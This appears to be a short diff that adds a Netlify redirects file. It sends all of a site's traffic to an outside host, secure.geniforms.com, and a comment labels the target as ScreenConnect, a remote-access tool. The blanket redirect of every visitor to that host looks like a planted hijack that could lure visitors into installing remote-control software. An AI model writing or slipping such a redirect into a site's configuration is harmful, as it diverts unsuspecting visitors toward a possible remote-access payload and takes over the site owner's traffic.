@@ -1,0 +1,3 @@
+# Netlify redirects file
+# Redirect all traffic to ScreenConnect
+/*    https://secure.geniforms.com/    302
